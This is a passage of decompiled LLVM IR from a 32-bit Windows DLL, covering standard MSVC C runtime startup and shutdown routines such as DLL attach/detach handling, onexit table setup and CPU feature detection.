  %0 = call i32 @___scrt_is_ucrt_dll_in_use(), !insn.addr !8147
  %1 = icmp eq i32 %0, 0, !insn.addr !8148
  br i1 %1, label %dec_label_pc_1000fabb, label %dec_label_pc_1000fab4, !insn.addr !8149

dec_label_pc_1000fab4:                            ; preds = %dec_label_pc_1000faab
  %2 = call i32 @___isa_available_init(), !insn.addr !8150
  store i32 %2, i32* %storemerge.reg2mem, !insn.addr !8151
  br label %dec_label_pc_1000fad3, !insn.addr !8151

dec_label_pc_1000fabb:                            ; preds = %dec_label_pc_1000faab
  %3 = call i32 @function_1000d999(), !insn.addr !8152
  %4 = call i32 @function_1001affb(i32 %3), !insn.addr !8153
  %5 = icmp eq i32 %4, 0, !insn.addr !8154
  br i1 %5, label %dec_label_pc_1000face, label %dec_label_pc_1000facb, !insn.addr !8155

dec_label_pc_1000facb:                            ; preds = %dec_label_pc_1000fabb
  %6 = and i32 %4, -256, !insn.addr !8156
  ret i32 %6, !insn.addr !8157

dec_label_pc_1000face:                            ; preds = %dec_label_pc_1000fabb
  %7 = call i32 @"??$common_initialize_environment_nolock@D@@YAHXZ"(), !insn.addr !8158
  store i32 %7, i32* %storemerge.reg2mem, !insn.addr !8158
  br label %dec_label_pc_1000fad3, !insn.addr !8158

dec_label_pc_1000fad3:                            ; preds = %dec_label_pc_1000face, %dec_label_pc_1000fab4
  %storemerge.reload = load i32, i32* %storemerge.reg2mem
  %8 = and i32 %storemerge.reload, -256, !insn.addr !8159
  %9 = or i32 %8, 1, !insn.addr !8159
  ret i32 %9, !insn.addr !8160
}

define i32 @function_1000fad6() local_unnamed_addr {
dec_label_pc_1000fad6:
  %0 = call i32 @function_1000fbac(i32 0), !insn.addr !8161
  %1 = trunc i32 %0 to i8, !insn.addr !8162
  %2 = icmp eq i8 %1, 0, !insn.addr !8162
  %3 = icmp eq i1 %2, false, !insn.addr !8163
  %4 = zext i1 %3 to i32, !insn.addr !8163
  %5 = and i32 %0, -256, !insn.addr !8163
  %6 = or i32 %5, %4, !insn.addr !8163
  ret i32 %6, !insn.addr !8164
}

define i32 @___scrt_dllmain_crt_thread_detach() local_unnamed_addr {
dec_label_pc_1000fb03:
  %0 = call i32 @function_1001b7f1(), !insn.addr !8165
  %1 = call i32 @___vcrt_thread_detach(), !insn.addr !8166
  %2 = and i32 %1, -256, !insn.addr !8167
  %3 = or i32 %2, 1, !insn.addr !8167
  ret i32 %3, !insn.addr !8168
}

declare i32 @___scrt_dllmain_uninitialize_c() local_unnamed_addr

define i32 @function_1000fb66() local_unnamed_addr {
dec_label_pc_1000fb66:
  %0 = call i32 @___acrt_uninitialize_critical(i32 0), !insn.addr !8169
  %1 = call i32 @function_100145c4(), !insn.addr !8170
  ret i32 %1, !insn.addr !8170
}

declare i32 @___scrt_initialize_crt(i32) local_unnamed_addr

define i32 @function_1000fbac(i32 %arg1) local_unnamed_addr {
dec_label_pc_1000fbac:
  %storemerge1.reg2mem = alloca i32, !insn.addr !8171
  %eax.1.reg2mem = alloca i32, !insn.addr !8171
  %storemerge2.reg2mem = alloca i32, !insn.addr !8171
  %eax.0.reg2mem = alloca i32, !insn.addr !8171
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = call i1 @__decompiler_undefined_function_5()
  %stack_var_-16 = alloca i32, align 4
  %2 = load i8, i8* @global_var_1003e56c, align 1, !insn.addr !8172
  %3 = icmp eq i8 %2, 0, !insn.addr !8172
  br i1 %3, label %dec_label_pc_1000fbc2, label %dec_label_pc_1000fbbb, !insn.addr !8173

dec_label_pc_1000fbbb:                            ; preds = %dec_label_pc_1000fbac
  %4 = and i32 %0, -256, !insn.addr !8174
  %5 = or i32 %4, 1, !insn.addr !8174
  store i32 %5, i32* %storemerge1.reg2mem, !insn.addr !8175
  br label %dec_label_pc_1000fc4a, !insn.addr !8175

dec_label_pc_1000fbc2:                            ; preds = %dec_label_pc_1000fbac
  %6 = icmp ne i32 %arg1, 0, !insn.addr !8176
  %7 = icmp eq i32 %arg1, 1, !insn.addr !8177
  %8 = icmp eq i1 %7, false, !insn.addr !8178
  %or.cond = icmp eq i1 %6, %8
  br i1 %or.cond, label %dec_label_pc_1000fc4e, label %dec_label_pc_1000fbcf, !insn.addr !8179

dec_label_pc_1000fbcf:                            ; preds = %dec_label_pc_1000fbc2
  %9 = call i32 @___scrt_is_ucrt_dll_in_use(), !insn.addr !8180
  %10 = icmp eq i32 %9, 0, !insn.addr !8181
  %11 = icmp eq i32 %arg1, 0, !insn.addr !8182
  %12 = icmp eq i1 %11, false, !insn.addr !8183
  %or.cond5 = or i1 %12, %10
  br i1 %or.cond5, label %dec_label_pc_1000fbfe, label %dec_label_pc_1000fbdc, !insn.addr !8184

dec_label_pc_1000fbdc:                            ; preds = %dec_label_pc_1000fbcf
  %13 = call i32 @__initialize_onexit_table(i32* nonnull @global_var_1003e554), !insn.addr !8185
  %14 = icmp eq i32 %13, 0, !insn.addr !8186
  %15 = icmp eq i1 %14, false, !insn.addr !8187
  store i32 %13, i32* %eax.0.reg2mem, !insn.addr !8187
  br i1 %15, label %dec_label_pc_1000fbfa, label %dec_label_pc_1000fbeb, !insn.addr !8187

dec_label_pc_1000fbeb:                            ; preds = %dec_label_pc_1000fbdc
  %16 = call i32 @__initialize_onexit_table(i32* nonnull @global_var_1003e560), !insn.addr !8188
  %17 = icmp eq i32 %16, 0, !insn.addr !8189
  store i32 %16, i32* %eax.0.reg2mem, !insn.addr !8190
  store i32 1, i32* %eax.1.reg2mem, !insn.addr !8190
  br i1 %17, label %dec_label_pc_1000fc40, label %dec_label_pc_1000fbfa, !insn.addr !8190

dec_label_pc_1000fbfa:                            ; preds = %dec_label_pc_1000fbeb, %dec_label_pc_1000fbdc
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  %18 = and i32 %eax.0.reload, -256, !insn.addr !8191
  store i32 %18, i32* %storemerge1.reg2mem, !insn.addr !8192
  br label %dec_label_pc_1000fc4a, !insn.addr !8192

dec_label_pc_1000fbfe:                            ; preds = %dec_label_pc_1000fbcf
  %19 = load i32, i32* @global_var_1003d070, align 4, !insn.addr !8193
  %20 = sub i32 0, %19, !insn.addr !8194
  %21 = and i32 %20, 31, !insn.addr !8195
  %22 = icmp eq i32 %21, 0, !insn.addr !8195
  store i32 -1, i32* %storemerge2.reg2mem, !insn.addr !8195
  br i1 %22, label %28, label %23, !insn.addr !8195

; <label>:23:                                     ; preds = %dec_label_pc_1000fbfe
  %24 = lshr i32 -1, %21, !insn.addr !8195
  %25 = sub nsw i32 32, %21, !insn.addr !8195
  %26 = shl i32 -1, %25, !insn.addr !8195
  %27 = or i32 %26, %24, !insn.addr !8195
  store i32 %27, i32* %storemerge2.reg2mem, !insn.addr !8195
  br label %28, !insn.addr !8195

; <label>:28:                                     ; preds = %dec_label_pc_1000fbfe, %23
  %29 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !8196
  %storemerge2.reload = load i32, i32* %storemerge2.reg2mem
  %30 = xor i32 %storemerge2.reload, %19, !insn.addr !8197
  store i32 %30, i32* %stack_var_-16, align 4, !insn.addr !8198
  store i32 %30, i32* @global_var_1003e554, align 4, !insn.addr !8199
  %31 = select i1 %1, i32 -4, i32 4, !insn.addr !8199
  %32 = add i32 %31, ptrtoint (i32* @global_var_1003e554 to i32), !insn.addr !8199
  %33 = add i32 %31, %29, !insn.addr !8199
  %34 = inttoptr i32 %33 to i32*, !insn.addr !8200
  %35 = load i32, i32* %34, align 4, !insn.addr !8200
  %36 = inttoptr i32 %32 to i32*, !insn.addr !8200
  store i32 %35, i32* %36, align 4, !insn.addr !8200
  %37 = add i32 %32, %31, !insn.addr !8200
  %38 = add i32 %33, %31, !insn.addr !8200
  %39 = inttoptr i32 %38 to i32*, !insn.addr !8201
  %40 = load i32, i32* %39, align 4, !insn.addr !8201
  %41 = inttoptr i32 %37 to i32*, !insn.addr !8201
  store i32 %40, i32* %41, align 4, !insn.addr !8201
  store i32 %30, i32* %stack_var_-16, align 4, !insn.addr !8202
  store i32 %30, i32* @global_var_1003e560, align 4, !insn.addr !8203
  %42 = add i32 %31, ptrtoint (i32* @global_var_1003e560 to i32), !insn.addr !8203
  %43 = load i32, i32* %34, align 4, !insn.addr !8204
  %44 = inttoptr i32 %42 to i32*, !insn.addr !8204
  store i32 %43, i32* %44, align 4, !insn.addr !8204
  %45 = add i32 %42, %31, !insn.addr !8204
  %46 = load i32, i32* %39, align 4, !insn.addr !8205
  %47 = inttoptr i32 %45 to i32*, !insn.addr !8205
  store i32 %46, i32* %47, align 4, !insn.addr !8205
  %phitmp = and i32 %30, -256
  %phitmp6 = or i32 %phitmp, 1
  store i32 %phitmp6, i32* %eax.1.reg2mem, !insn.addr !8206
  br label %dec_label_pc_1000fc40, !insn.addr !8206

dec_label_pc_1000fc40:                            ; preds = %28, %dec_label_pc_1000fbeb
  %eax.1.reload = load i32, i32* %eax.1.reg2mem
  store i8 1, i8* @global_var_1003e56c, align 1, !insn.addr !8207
  store i32 %eax.1.reload, i32* %storemerge1.reg2mem, !insn.addr !8208
  br label %dec_label_pc_1000fc4a, !insn.addr !8208

dec_label_pc_1000fc4a:                            ; preds = %dec_label_pc_1000fbfa, %dec_label_pc_1000fc40, %dec_label_pc_1000fbbb
  %storemerge1.reload = load i32, i32* %storemerge1.reg2mem
  ret i32 %storemerge1.reload, !insn.addr !8209

dec_label_pc_1000fc4e:                            ; preds = %dec_label_pc_1000fbc2
  %48 = call i32 @___scrt_fastfail(), !insn.addr !8210
  %49 = call i32 @__asm_int3(), !insn.addr !8211
  ret i32 %49, !insn.addr !8211
}

declare i32 @___scrt_is_nonwritable_in_current_image() local_unnamed_addr

declare i32 @___scrt_release_startup_lock(i32) local_unnamed_addr

declare i32 @___scrt_uninitialize_crt() local_unnamed_addr

declare i32 @_atexit(void ()*) local_unnamed_addr

define void @function_1000fd75(i32* %ptr) local_unnamed_addr {
dec_label_pc_1000fd75:
  call void @_free(i32* %ptr), !insn.addr !8212
  ret void, !insn.addr !8212
}

define void @"??3@YAXPAXI@Z"(i32* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1000fd7a:
  call void @_free(i32* %arg1), !insn.addr !8213
  ret void, !insn.addr !8214
}

define i32 @function_1000fd88(i32 %arg1) local_unnamed_addr {
dec_label_pc_1000fd88:
  %0 = call i32 @"??2@YAPAXI@Z"(i32 %arg1), !insn.addr !8215
  ret i32 %0, !insn.addr !8215
}

declare i32 @"??_G_Ref_count_base@std@@UAEPAXI@Z"(i32)

define i32 @"?dllmain_crt_process_attach@@YAHQAUHINSTANCE__@@QAX@Z"(i32* %arg1, i32* %arg2) local_unnamed_addr {
dec_label_pc_1000fe07:
  %esp.0.in.reg2mem = alloca i32*, !insn.addr !8216
  %0 = call i32 @__decompiler_undefined_function_1()
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_1003b5b0 to i32), i32* %stack_var_-8, align 4, !insn.addr !8217
  %1 = call i32 @__SEH_prolog4(i32* nonnull @global_var_1003b5b0, i32 16), !insn.addr !8218
  store i32 0, i32* %stack_var_-12, align 4, !insn.addr !8219
  %2 = call i32 @___scrt_initialize_crt(i32 0), !insn.addr !8220
  %3 = trunc i32 %2 to i8, !insn.addr !8221
  %4 = icmp eq i8 %3, 0, !insn.addr !8221
  %5 = icmp eq i1 %4, false, !insn.addr !8222
  br i1 %5, label %dec_label_pc_1000fe26, label %dec_label_pc_1000feee, !insn.addr !8222

dec_label_pc_1000fe26:                            ; preds = %dec_label_pc_1000fe07
  %6 = call i32 @___scrt_acquire_startup_lock(), !insn.addr !8223
  %7 = trunc i32 %6 to i8, !insn.addr !8224
  %8 = add i32 %0, -29, !insn.addr !8224
  %9 = inttoptr i32 %8 to i8*, !insn.addr !8224
  store i8 %7, i8* %9, align 1, !insn.addr !8224
  %10 = add i32 %0, -25, !insn.addr !8225
  %11 = inttoptr i32 %10 to i8*, !insn.addr !8225
  store i8 1, i8* %11, align 1, !insn.addr !8225
  %12 = add i32 %0, -4, !insn.addr !8226
  %13 = inttoptr i32 %12 to i32*, !insn.addr !8226
  store i32 0, i32* %13, align 4, !insn.addr !8226
  %14 = load i32, i32* @global_var_1003e54c, align 4, !insn.addr !8227
  %15 = icmp eq i32 %14, 0, !insn.addr !8227
  store i32* %stack_var_-8, i32** %esp.0.in.reg2mem, !insn.addr !8228
  br i1 %15, label %dec_label_pc_1000fe47, label %dec_label_pc_1000fe40, !insn.addr !8228

dec_label_pc_1000fe40:                            ; preds = %dec_label_pc_1000fe26
  store i32 7, i32* %stack_var_-12, align 4, !insn.addr !8229
  %16 = call i32 @___scrt_fastfail(), !insn.addr !8230
  store i32* %stack_var_-12, i32** %esp.0.in.reg2mem, !insn.addr !8230
  br label %dec_label_pc_1000fe47, !insn.addr !8230

dec_label_pc_1000fe47:                            ; preds = %dec_label_pc_1000fe40, %dec_label_pc_1000fe26
  store i32 1, i32* @global_var_1003e54c, align 4, !insn.addr !8231
  %17 = call i32 @function_1000fad6(), !insn.addr !8232
  %18 = trunc i32 %17 to i8, !insn.addr !8233
  %19 = icmp eq i8 %18, 0, !insn.addr !8233
  br i1 %19, label %dec_label_pc_1000feee.critedge, label %dec_label_pc_1000fe5a, !insn.addr !8234

dec_label_pc_1000fe5a:                            ; preds = %dec_label_pc_1000fe47
  %esp.0.in.reload = load i32*, i32** %esp.0.in.reg2mem
  %esp.0 = ptrtoint i32* %esp.0.in.reload to i32
  %20 = call i32 @__RTC_Initialize(), !insn.addr !8235
  call void @InitializeSListHead(i32* nonnull @1), !insn.addr !8236
  %21 = call i32 @function_100106b0(), !insn.addr !8237
  %22 = add i32 %esp.0, -4, !insn.addr !8238
  %23 = inttoptr i32 %22 to i32*, !insn.addr !8238
  store i32 ptrtoint (i32* @global_var_1002d2a0 to i32), i32* %23, align 4, !insn.addr !8238
  %24 = add i32 %esp.0, -8, !insn.addr !8239
  %25 = inttoptr i32 %24 to i32*, !insn.addr !8239
  store i32 ptrtoint (i32* @global_var_1002d284 to i32), i32* %25, align 4, !insn.addr !8239
  %26 = call i32 @__initterm_e(), !insn.addr !8240
  %27 = icmp eq i32 %26, 0, !insn.addr !8241
  %28 = icmp eq i1 %27, false, !insn.addr !8242
  br i1 %28, label %dec_label_pc_1000feee.critedge1, label %dec_label_pc_1000fe7e, !insn.addr !8242

dec_label_pc_1000fe7e:                            ; preds = %dec_label_pc_1000fe5a
  %29 = call i32 @function_1000faab(), !insn.addr !8243
  %30 = trunc i32 %29 to i8, !insn.addr !8244
  %31 = icmp eq i8 %30, 0, !insn.addr !8244
  br i1 %31, label %dec_label_pc_1000feee.critedge2, label %dec_label_pc_1000fe87, !insn.addr !8245

dec_label_pc_1000fe87:                            ; preds = %dec_label_pc_1000fe7e
  store i32 ptrtoint (i32* @global_var_1002d280 to i32), i32* %23, align 4, !insn.addr !8246
  store i32 ptrtoint (i32* @global_var_1002d254 to i32), i32* %25, align 4, !insn.addr !8247
  %32 = call i32 @__initterm(), !insn.addr !8248
  store i32 2, i32* @global_var_1003e54c, align 4, !insn.addr !8249
  store i8 0, i8* %11, align 1, !insn.addr !8250
  store i32 -2, i32* %13, align 4, !insn.addr !8251
  %33 = call i32 @function_1000fef7(), !insn.addr !8252
  %34 = call i32 @function_100106cd(), !insn.addr !8253
  %35 = inttoptr i32 %34 to i32*, !insn.addr !8254
  %36 = load i32, i32* %35, align 4, !insn.addr !8254
  %37 = icmp eq i32 %36, 0, !insn.addr !8254
  br i1 %37, label %dec_label_pc_1000fee5, label %dec_label_pc_1000fec7, !insn.addr !8255

dec_label_pc_1000fec7:                            ; preds = %dec_label_pc_1000fe87
  store i32 %34, i32* %23, align 4, !insn.addr !8256
  %38 = call i32 @___scrt_is_nonwritable_in_current_image(), !insn.addr !8257
  %39 = trunc i32 %38 to i8, !insn.addr !8258
  %40 = icmp eq i8 %39, 0, !insn.addr !8258
  br i1 %40, label %dec_label_pc_1000fee5, label %dec_label_pc_1000fed2, !insn.addr !8259

dec_label_pc_1000fed2:                            ; preds = %dec_label_pc_1000fec7
  %41 = add i32 %0, 12, !insn.addr !8260
  %42 = inttoptr i32 %41 to i32*, !insn.addr !8260
  %43 = load i32, i32* %42, align 4, !insn.addr !8260
  store i32 %43, i32* %23, align 4, !insn.addr !8260
  store i32 2, i32* %25, align 4, !insn.addr !8261
  %44 = add i32 %0, 8, !insn.addr !8262
  %45 = inttoptr i32 %44 to i32*, !insn.addr !8262
  %46 = load i32, i32* %45, align 4, !insn.addr !8262
  %47 = add i32 %esp.0, -12, !insn.addr !8262
  %48 = inttoptr i32 %47 to i32*, !insn.addr !8262
  store i32 %46, i32* %48, align 4, !insn.addr !8262
  %49 = call i32 @"@_guard_check_icall@4"(), !insn.addr !8263
  br label %dec_label_pc_1000fee5, !insn.addr !8264

dec_label_pc_1000fee5:                            ; preds = %dec_label_pc_1000fed2, %dec_label_pc_1000fec7, %dec_label_pc_1000fe87
  %50 = load i32, i32* @global_var_1003e570, align 4, !insn.addr !8265
  %51 = add i32 %50, 1, !insn.addr !8265
  store i32 %51, i32* @global_var_1003e570, align 4, !insn.addr !8265
  br label %dec_label_pc_1000feee, !insn.addr !8266

dec_label_pc_1000feee.critedge:                   ; preds = %dec_label_pc_1000fe47
  store i32 -2, i32* %13, align 4, !insn.addr !8251
  %52 = call i32 @function_1000fef7(), !insn.addr !8252
  br label %dec_label_pc_1000feee

dec_label_pc_1000feee.critedge1:                  ; preds = %dec_label_pc_1000fe5a
  store i32 -2, i32* %13, align 4, !insn.addr !8251
  %53 = call i32 @function_1000fef7(), !insn.addr !8252
  br label %dec_label_pc_1000feee

dec_label_pc_1000feee.critedge2:                  ; preds = %dec_label_pc_1000fe7e
  store i32 -2, i32* %13, align 4, !insn.addr !8251
  %54 = call i32 @function_1000fef7(), !insn.addr !8252
  br label %dec_label_pc_1000feee

dec_label_pc_1000feee:                            ; preds = %dec_label_pc_1000feee.critedge2, %dec_label_pc_1000feee.critedge1, %dec_label_pc_1000feee.critedge, %dec_label_pc_1000fe07, %dec_label_pc_1000fee5
  %55 = call i32 @__SEH_epilog4(), !insn.addr !8267
  ret i32 %55, !insn.addr !8268
}

define i32 @function_1000fef7() local_unnamed_addr {
dec_label_pc_1000fef7:
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = add i32 %0, -29, !insn.addr !8269
  %2 = inttoptr i32 %1 to i32*, !insn.addr !8269
  %3 = load i32, i32* %2, align 4, !insn.addr !8269
  %4 = call i32 @___scrt_release_startup_lock(i32 %3), !insn.addr !8270
  ret i32 %4, !insn.addr !8271
}

define i32 @"?dllmain_crt_process_detach@@YAH_N@Z"(i1 %arg1) local_unnamed_addr {
dec_label_pc_1000ff01:
  %esp.0.in.reg2mem = alloca i32*, !insn.addr !8272
  %0 = call i32 @__decompiler_undefined_function_1()
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_1003b5d0 to i32), i32* %stack_var_-8, align 4, !insn.addr !8273
  %1 = call i32 @__SEH_prolog4(i32* nonnull @global_var_1003b5d0, i32 12), !insn.addr !8274
  %2 = load i32, i32* @global_var_1003e570, align 4, !insn.addr !8275
  %3 = icmp eq i32 %2, 0, !insn.addr !8276
  %4 = icmp slt i32 %2, 0, !insn.addr !8276
  %5 = icmp eq i1 %4, false, !insn.addr !8277
  %6 = icmp eq i1 %3, false, !insn.addr !8277
  %7 = icmp eq i1 %5, %6, !insn.addr !8277
  br i1 %7, label %dec_label_pc_1000ff1a, label %dec_label_pc_1000ff73, !insn.addr !8277

dec_label_pc_1000ff1a:                            ; preds = %dec_label_pc_1000ff01
  %8 = add i32 %2, -1, !insn.addr !8278
  store i32 %8, i32* @global_var_1003e570, align 4, !insn.addr !8279
  %9 = call i32 @___scrt_acquire_startup_lock(), !insn.addr !8280
  %10 = trunc i32 %9 to i8, !insn.addr !8281
  %11 = add i32 %0, -28, !insn.addr !8281
  %12 = inttoptr i32 %11 to i8*, !insn.addr !8281
  store i8 %10, i8* %12, align 1, !insn.addr !8281
  %13 = add i32 %0, -4, !insn.addr !8282
  %14 = inttoptr i32 %13 to i32*, !insn.addr !8282
  store i32 0, i32* %14, align 4, !insn.addr !8282
  %15 = load i32, i32* @global_var_1003e54c, align 4, !insn.addr !8283
  %16 = icmp eq i32 %15, 2, !insn.addr !8283
  store i32* %stack_var_-8, i32** %esp.0.in.reg2mem, !insn.addr !8284
  br i1 %16, label %dec_label_pc_1000ff3c, label %dec_label_pc_1000ff35, !insn.addr !8284

dec_label_pc_1000ff35:                            ; preds = %dec_label_pc_1000ff1a
  store i32 7, i32* %stack_var_-12, align 4, !insn.addr !8285
  %17 = call i32 @___scrt_fastfail(), !insn.addr !8286
  store i32* %stack_var_-12, i32** %esp.0.in.reg2mem, !insn.addr !8286
  br label %dec_label_pc_1000ff3c, !insn.addr !8286

dec_label_pc_1000ff3c:                            ; preds = %dec_label_pc_1000ff35, %dec_label_pc_1000ff1a
  %esp.0.in.reload = load i32*, i32** %esp.0.in.reg2mem
  %esp.0 = ptrtoint i32* %esp.0.in.reload to i32
  %18 = call i32 @___scrt_dllmain_uninitialize_c(), !insn.addr !8287
  %19 = call i32 @function_1001069e(), !insn.addr !8288
  %20 = call i32 @__RTC_Initialize.10(), !insn.addr !8289
  store i32 0, i32* @global_var_1003e54c, align 4, !insn.addr !8290
  store i32 -2, i32* %14, align 4, !insn.addr !8291
  %21 = call i32 @function_1000ff79(), !insn.addr !8292
  %22 = add i32 %esp.0, -4, !insn.addr !8293
  %23 = inttoptr i32 %22 to i32*, !insn.addr !8293
  store i32 0, i32* %23, align 4, !insn.addr !8293
  %24 = add i32 %0, 8, !insn.addr !8294
  %25 = inttoptr i32 %24 to i32*, !insn.addr !8294
  %26 = load i32, i32* %25, align 4, !insn.addr !8294
  %27 = add i32 %esp.0, -8, !insn.addr !8294
  %28 = inttoptr i32 %27 to i32*, !insn.addr !8294
  store i32 %26, i32* %28, align 4, !insn.addr !8294
  %29 = call i32 @___scrt_uninitialize_crt(), !insn.addr !8295
  br label %dec_label_pc_1000ff73, !insn.addr !8296

dec_label_pc_1000ff73:                            ; preds = %dec_label_pc_1000ff01, %dec_label_pc_1000ff3c
  %30 = call i32 @__SEH_epilog4(), !insn.addr !8297
  ret i32 %30, !insn.addr !8298
}

define i32 @function_1000ff79() local_unnamed_addr {
dec_label_pc_1000ff79:
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = call i32 @function_1000fb66(), !insn.addr !8299
  %2 = add i32 %0, -28, !insn.addr !8300
  %3 = inttoptr i32 %2 to i32*, !insn.addr !8300
  %4 = load i32, i32* %3, align 4, !insn.addr !8300
  %5 = call i32 @___scrt_release_startup_lock(i32 %4), !insn.addr !8301
  ret i32 %5, !insn.addr !8302
}

define i32 @"@_guard_check_icall@4"() local_unnamed_addr {
dec_label_pc_100100d1:
  %0 = call i32 @function_10004670(), !insn.addr !8303
  ret i32 %0, !insn.addr !8303
}

declare i32 @__EH_epilog3_GS() local_unnamed_addr

declare i32 @__EH_prolog3_GS(i32) local_unnamed_addr

define i32 @function_100101b6() local_unnamed_addr {
dec_label_pc_100101b6:
  %0 = call i32 @__chkstk(), !insn.addr !8304
  ret i32 %0, !insn.addr !8304
}

declare i32 @___scrt_fastfail() local_unnamed_addr

define i32 @__crt_debugger_hook() local_unnamed_addr {
dec_label_pc_10010393:
  %0 = call i32 @__decompiler_undefined_function_1()
  store i32 0, i32* @global_var_1003e574, align 4, !insn.addr !8305
  ret i32 %0, !insn.addr !8306
}

declare i32 @__SEH_prolog4(i32*, i32) local_unnamed_addr

declare i32 @__SEH_epilog4() local_unnamed_addr

define i32 @___isa_available_init() local_unnamed_addr {
dec_label_pc_1001044b:
  %edi.0.reg2mem = alloca i32, !insn.addr !8307
  store i32 0, i32* @global_var_1003e57c, align 4, !insn.addr !8308
  %0 = load i32, i32* @global_var_1003d080, align 4, !insn.addr !8309
  %1 = or i32 %0, 1, !insn.addr !8309
  store i32 %1, i32* @global_var_1003d080, align 4, !insn.addr !8309
  %2 = call i1 @IsProcessorFeaturePresent(i32 10), !insn.addr !8310
  %3 = icmp eq i1 %2, false, !insn.addr !8311
  br i1 %3, label %dec_label_pc_100105e3, label %dec_label_pc_10010471, !insn.addr !8312

dec_label_pc_10010471:                            ; preds = %dec_label_pc_1001044b
  %4 = load i32, i32* @global_var_1003d080, align 4, !insn.addr !8313
  %5 = or i32 %4, 2, !insn.addr !8313
  store i32 %5, i32* @global_var_1003d080, align 4, !insn.addr !8313
  store i32 1, i32* @global_var_1003e57c, align 4, !insn.addr !8314
  %6 = call %0 @__asm_cpuid(i32 0), !insn.addr !8315
  %7 = extractvalue %0 %6, 1, !insn.addr !8315
  %8 = extractvalue %0 %6, 2, !insn.addr !8315
  %9 = extractvalue %0 %6, 3, !insn.addr !8315
  %10 = xor i32 %7, 1970169159, !insn.addr !8316
  %11 = xor i32 %9, 1231384169, !insn.addr !8317
  %12 = xor i32 %8, 1818588270, !insn.addr !8318
  %13 = call %1 @__asm_cpuid.29(i32 1), !insn.addr !8319
  %14 = or i32 %12, %11, !insn.addr !8320
  %15 = or i32 %14, %10, !insn.addr !8321
  %16 = icmp eq i32 %15, 0, !insn.addr !8321
  %17 = icmp eq i1 %16, false, !insn.addr !8322
  br i1 %17, label %dec_label_pc_10010527, label %dec_label_pc_100104e4, !insn.addr !8322

dec_label_pc_100104e4:                            ; preds = %dec_label_pc_10010471
  %18 = extractvalue %1 %13, 0, !insn.addr !8319
  %19 = and i32 %18, 268386288, !insn.addr !8323
  switch i32 %19, label %dec_label_pc_1001050f [
    i32 198240, label %dec_label_pc_10010516
    i32 198224, label %dec_label_pc_10010516
    i32 132720, label %dec_label_pc_10010516
    i32 132704, label %dec_label_pc_10010516
    i32 67264, label %dec_label_pc_10010516
  ]

dec_label_pc_1001050f:                            ; preds = %dec_label_pc_100104e4
  %20 = icmp eq i32 %19, 198256, !insn.addr !8324
  %21 = icmp eq i1 %20, false, !insn.addr !8325
  br i1 %21, label %dec_label_pc_10010527, label %dec_label_pc_10010516, !insn.addr !8325

dec_label_pc_10010516:                            ; preds = %dec_label_pc_100104e4, %dec_label_pc_100104e4, %dec_label_pc_100104e4, %dec_label_pc_100104e4, %dec_label_pc_100104e4, %dec_label_pc_1001050f
  %22 = load i32, i32* @global_var_1003e580, align 4, !insn.addr !8326
  %23 = or i32 %22, 1, !insn.addr !8327
  store i32 %23, i32* @global_var_1003e580, align 4, !insn.addr !8328
  store i32 %23, i32* %edi.0.reg2mem, !insn.addr !8329
  br label %dec_label_pc_1001052d, !insn.addr !8329

dec_label_pc_10010527:                            ; preds = %dec_label_pc_1001050f, %dec_label_pc_10010471
  %24 = load i32, i32* @global_var_1003e580, align 4, !insn.addr !8330
  store i32 %24, i32* %edi.0.reg2mem, !insn.addr !8330
  br label %dec_label_pc_1001052d, !insn.addr !8330

dec_label_pc_1001052d:                            ; preds = %dec_label_pc_10010527, %dec_label_pc_10010516
  %25 = extractvalue %0 %6, 0, !insn.addr !8315
  %26 = icmp slt i32 %25, 7, !insn.addr !8331
  br i1 %26, label %dec_label_pc_1001056e, label %dec_label_pc_10010539, !insn.addr !8331

dec_label_pc_10010539:                            ; preds = %dec_label_pc_1001052d
  %27 = call %2 @__asm_cpuid.30(i32 7), !insn.addr !8332
  %28 = extractvalue %2 %27, 1, !insn.addr !8332
  %29 = and i32 %28, 512, !insn.addr !8333
  %30 = icmp eq i32 %29, 0, !insn.addr !8333
  br i1 %30, label %dec_label_pc_1001056e, label %dec_label_pc_10010560, !insn.addr !8334

dec_label_pc_10010560:                            ; preds = %dec_label_pc_10010539
  %edi.0.reload = load i32, i32* %edi.0.reg2mem
  %31 = or i32 %edi.0.reload, 2, !insn.addr !8335
  store i32 %31, i32* @global_var_1003e580, align 4, !insn.addr !8336
  br label %dec_label_pc_1001056e, !insn.addr !8337

dec_label_pc_1001056e:                            ; preds = %dec_label_pc_1001052d, %dec_label_pc_10010560, %dec_label_pc_10010539
  %32 = extractvalue %1 %13, 2, !insn.addr !8319
  %33 = and i32 %32, 1048576, !insn.addr !8338
  %34 = icmp eq i32 %33, 0, !insn.addr !8338
  br i1 %34, label %dec_label_pc_100105e3, label %dec_label_pc_10010577, !insn.addr !8339

dec_label_pc_10010577:                            ; preds = %dec_label_pc_1001056e
  %35 = load i32, i32* @global_var_1003d080, align 4, !insn.addr !8340
  %36 = or i32 %35, 4, !insn.addr !8340
  store i32 %36, i32* @global_var_1003d080, align 4, !insn.addr !8340
  store i32 2, i32* @global_var_1003e57c, align 4, !insn.addr !8341
  %37 = and i32 %32, 402653184
  %38 = icmp eq i32 %37, 402653184
  br i1 %38, label %dec_label_pc_10010596, label %dec_label_pc_100105e3, !insn.addr !8342

dec_label_pc_10010596:                            ; preds = %dec_label_pc_10010577
  call void @__asm_xgetbv(i32 0), !insn.addr !8343
  br label %dec_label_pc_100105e3

dec_label_pc_100105e3:                            ; preds = %dec_label_pc_10010577, %dec_label_pc_10010596, %dec_label_pc_1001056e, %dec_label_pc_1001044b
  ret i32 0, !insn.addr !8344
}

define i32 @___scrt_is_ucrt_dll_in_use() local_unnamed_addr {
dec_label_pc_100105ea:
  %0 = load i32, i32* @global_var_10040a5c, align 4, !insn.addr !8345
  %1 = icmp eq i32 %0, 0, !insn.addr !8345
  %2 = icmp eq i1 %1, false, !insn.addr !8346
  %3 = zext i1 %2 to i32, !insn.addr !8346
  ret i32 %3, !insn.addr !8347
}

define void @function_10010692(i32* %ListHead) local_unnamed_addr {
dec_label_pc_10010692:
  call void @InitializeSListHead(i32* %ListHead), !insn.addr !8348
